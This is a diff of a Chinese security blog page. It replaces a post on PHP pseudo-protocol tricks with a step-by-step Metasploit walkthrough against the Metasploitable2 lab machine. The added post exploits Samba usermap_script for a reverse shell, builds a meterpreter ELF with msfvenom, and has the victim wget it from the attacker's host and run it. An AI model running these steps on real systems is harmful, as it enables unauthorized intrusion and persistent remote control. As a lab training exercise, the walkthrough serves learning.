@@ -5,19 +5,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="伪协议, pgg,信息安全，小白教程，情感博主">
-    <meta name="description" content="代码审计之伪协议有四种常见伪协议：
-
-file://协议 
-php://filter协议 
-php://input协议 
-data://协议
-
-file://协议 :用于访问本地系统文件
-
-首先创建一个可控的php文件
-
-然后再生成一个1.">
+    <meta name="keywords" content="pgg,信息安全，小白教程，情感博主">
+    <meta name="description" content="title: 渗透Met2date: 2019-03-28
+假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马​           前言： 每个操作系统都会存在各种Bug,像Windows这">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -25,7 +15,7 @@ file://协议 :用于访问本地系统文件
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>伪协议 | pgg学长</title>
+    <title>pgg学长</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -67,13 +57,13 @@ file://协议 :用于访问本地系统文件
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        伪协议
+                        
                     </div>
                 </div>
             </div>
@@ -95,45 +85,113 @@ file://协议 :用于访问本地系统文件
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2019-01-17
+                    <i class="fa fa-clock-o fa-fw"></i>2019-03-28
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="代码审计之伪协议"><a href="#代码审计之伪协议" class="headerlink" title="代码审计之伪协议"></a><strong>代码审计之伪协议</strong></h1><p><em>有四种常见伪协议：</em></p>
+                <p>title: 渗透Met2<br>date: 2019-03-28</p>
+<h1 id="假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马"><a href="#假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马" class="headerlink" title="假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马"></a>假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马</h1><p>​           <strong>前言：</strong> <em>每个操作系统都会存在各种Bug,像Windows这样有版权的操作系统，微软公司会快速地开发针对这些Bug或漏洞的补丁，并为用户提供更新。全世界有大量的漏洞研究人员会夜以继日地发现、研究新的Bug,这些没有公布补丁的Bug就是所谓的0day漏洞，由于这种漏洞对网络安全具有巨大威胁，因此0day漏洞页成为黑客的最爱。实际上能掌握0day的黑客少之又少。</em></p>
 <ol>
-<li>file://协议 </li>
-<li>php://filter协议 </li>
-<li>php://input协议 </li>
-<li>data://协议</li>
+<li>首先，先进入msf框架内，在命令行输入：msfconsole   便可以进入msf内</li>
 </ol>
-<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议 :"></a>file://协议 :</h3><p><em>用于访问本地系统文件</em></p>
-<p><a href=""><img src="http://img.027cgb.com/613977/代码审计伪协议/1.png"></a></p>
-<p><em>首先创建一个可控的php文件</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/2.png"></a></p>
-<p><em>然后再生成一个1.txt的文档</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/3.png"></a></p>
-<p><em>然后打开phpstudy  进入浏览器进入到file.php里并输入以下内容便可以达到目的</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/4.png"></a></p>
-<h3 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议:"></a>php://filter协议:</h3><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/5.png"></a></p>
-<p><em>直接在浏览器加上以下内容</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/6.png"></a></p>
-<h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议:"></a>php://input协议:</h3><p><em>可以访问原始数据的只读流</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/7.png"></a></p>
-<p><em>输入以下内容便能执行代码执行的功能</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/8.png"></a></p>
-<p><em>同理，我们也可以写入一个文件  代码如下：</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/9.png"></a></p>
-<p><em>同理，我们是不是可以写入一句话木马，然后用菜刀连接</em></p>
-<h3 id="data-协议："><a href="#data-协议：" class="headerlink" title="data://协议："></a>data://协议：</h3><p><em>数据</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/10.png"></a></p>
-<p><em>执行代码如下：</em></p>
-<p><img src="http://img.027cgb.com/613977/代码审计伪协议/11.png"></p>
-<p><em>如果想执行bs64的话就在后面加上bs64就好了</em></p>
-<p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/12.png"></a></p>
-<p>  注：一步一步的成长</p>
+<p><img src="http://tu.027cgb.com/613977/共计/1-jpg.png"></p>
+<ol start="2">
+<li><p>首先第一步用nmap扫描目标主机的Ip   </p>
+<p><em>使用命令：nmap –sV 192.168.127.136</em></p>
+</li>
+</ol>
+<p>   <img src="http://tu.027cgb.com/613977/共计/2-jpg.png"></p>
+<ol start="3">
+<li><p>在扫描结果中出现了Samba smbd 3.x-4.x 的服务，我们可以用search XXX  去查看可用的exploit   </p>
+<p>  <em>使用命令： search samba</em></p>
+</li>
+</ol>
+<p>   <img src="http://tu.027cgb.com/613977/共计/3-jpg.png"></p>
+<p>   当看到excellent  说明是比较新，可以使用的</p>
+<p>   <img src="http://tu.027cgb.com/613977/共计/4.png"></p>
+<p>   那我们便使用这个exploit  </p>
+<p>   命令语句：use exploit/multi/samba/usermap_script*</p>
+<p>   <img src="http://tu.027cgb.com/613977/共计/5.png"></p>
+<ol start="4">
+<li><p>当我们进入后先看看他需要的设置和可用的payload</p>
+<p>   命令： show options*</p>
+</li>
+</ol>
+<p>   <img src="http://tu.027cgb.com/613977/共计/6.png"></p>
+<p>​        命令：show payloads*</p>
+<p><img src="http://tu.027cgb.com/613977/共计/7.png"></p>
+<ol start="5">
+<li><p>此时我们选择 的payload 是  cmd/unix/reverse  </p>
+<p><em>使用命令：set payload cmd/unix/reverse</em></p>
+<p><img src="http://tu.027cgb.com/613977/共计/8.png"></p>
+</li>
+</ol>
+<p>​      现在开始绑定我们的数据  首先先确定被攻击主机的IP</p>
+<p>​      命令是：set rhosts 192.168.127.136*</p>
+<p><img src="http://tu.027cgb.com/613977/共计/9.png"></p>
+<p>​      绑定端口   命令： set RPORT 139     这个端口必须得和发现漏洞德端口一致</p>
+<p>​      绑定攻击主机的Ip   </p>
+<p>​      命令：set lHOST 192.168.127.138*</p>
+<p><img src="http://tu.027cgb.com/613977/共计/10.png"></p>
+<ol start="6">
+<li><p>然后就是直接连接被攻击机</p>
+<p><em>命令： run</em></p>
+</li>
+</ol>
+<p>   <img src="http://tu.027cgb.com/613977/共计/11.png"></p>
+<ol start="7">
+<li><p>这里我们已经连上被攻击机了 我们来查看一下我们是什么用户</p>
+<p><em>命令：Whomai</em></p>
+<p><img src="http://tu.027cgb.com/613977/共计/12.png"></p>
+</li>
+<li><p>经拿到被攻击机的shell了，但是并不满足如痴，想上传一个木马病毒，说干就干新开一个命令行窗口，新建一个病毒</p>
+<p><em>命令：msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf</em></p>
+</li>
+</ol>
+<p>   <img src="http://tu.027cgb.com/613977/共计/13.png"></p>
+<p>​         已经好了  我们ls看一下</p>
+<p><img src="http://tu.027cgb.com/613977/共计/14.png"></p>
+<ol start="9">
+<li><p>现在我们开启ftp服务，用控制的shell去下载我们的病毒</p>
+<p><em>命令： python -m SimpleHTTPServer 8000</em></p>
+</li>
+</ol>
+<p>   <img src="http://tu.027cgb.com/613977/共计/15.png"></p>
+<ol start="10">
+<li><p>现在开始控制被攻击主机的shell去下载</p>
+<p><em>命令： wget &lt;<a href="http://192.168.127.138:8000/payload.elf" target="_blank" rel="noopener">http://192.168.127.138:8000/payload.elf</a></em></p>
+<p><em>&gt;</em></p>
+<p><img src="http://tu.027cgb.com/613977/共计/16.png"></p>
+</li>
+</ol>
+<p>​     已经下载成功了   我们ls查看下</p>
+<p><img src="http://tu.027cgb.com/613977/共计/17.png"></p>
+<ol start="11">
+<li><p>已经有了 现在我们帮这个文件添加可执行权</p>
+<p>命令  chmod +x payload.elf</p>
+<p>然后执行</p>
+<p>命令：  ./payload.elf</p>
+</li>
+</ol>
+<pre><code>&lt;img src=&quot;http://tu.027cgb.com/613977/共计/18.png&quot; /&gt;
+</code></pre><p>​       当然，此时是没有任何反应   现在我们进入exploit/multi/handler模块</p>
+<p>​        <img src="http://tu.027cgb.com/613977/共计/19.png"></p>
+<p>​      然后进入  linux/x86/meterpreter/reverse_tcp   模块</p>
+<p><img src="http://tu.027cgb.com/613977/共计/20.png"></p>
+<p>​      Show options一下</p>
+<p><img src="http://tu.027cgb.com/613977/共计/21.png"></p>
+<ol start="12">
+<li>绑定攻击主机ip，然后运行挂起，在shell那边运行那个程序，然后sessions  一下</li>
+</ol>
+<pre><code>&lt;img src=&quot;http://tu.027cgb.com/613977/共计/22.png&quot; /&gt;
+</code></pre><ol start="13">
+<li>然后选择 sessions 1  就可以进入shell了</li>
+</ol>
+<pre><code>&lt;img src=&quot;http://tu.027cgb.com/613977/共计/23.png&quot; /&gt;
+</code></pre><p>​       #注: <strong>好了，是不是很简单呀，不过要多尝试哦， 对其他系统也是可以的，只是命令不同</strong>-_—</p>
 
             </div>
             <hr>
@@ -264,7 +322,7 @@ file://协议 :用于访问本地系统文件
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://pgg666.org" class="b-link-green">pgg学长</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/01/17/php代码审计篇之伪协议/" class="b-link-green">伪协议</a>
+                    <a href="/2019/03/28/渗透Met2/" class="b-link-green"></a>
                 </p>
             </div>
         </div>
@@ -286,7 +344,7 @@ file://协议 :用于访问本地系统文件
     <div class="row article-row">
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
                 <a href="/2019/03/28/渗透Met2/">
                     <div class="card-image">
@@ -301,9 +359,9 @@ file://协议 :用于访问本地系统文件
                     <div class="summary">title: 渗透Met2date: 2019-03-28
 假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马​           前言： 每个操作系统都会存在各种Bug,像Windows这</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -312,13 +370,14 @@ file://协议 :用于访问本地系统文件
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
         
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">本篇</div>
+            <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
                 <a href="/2019/01/17/php代码审计篇之伪协议/">
                     <div class="card-image">
@@ -354,7 +413,6 @@ file://协议 :用于访问本地系统文件
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
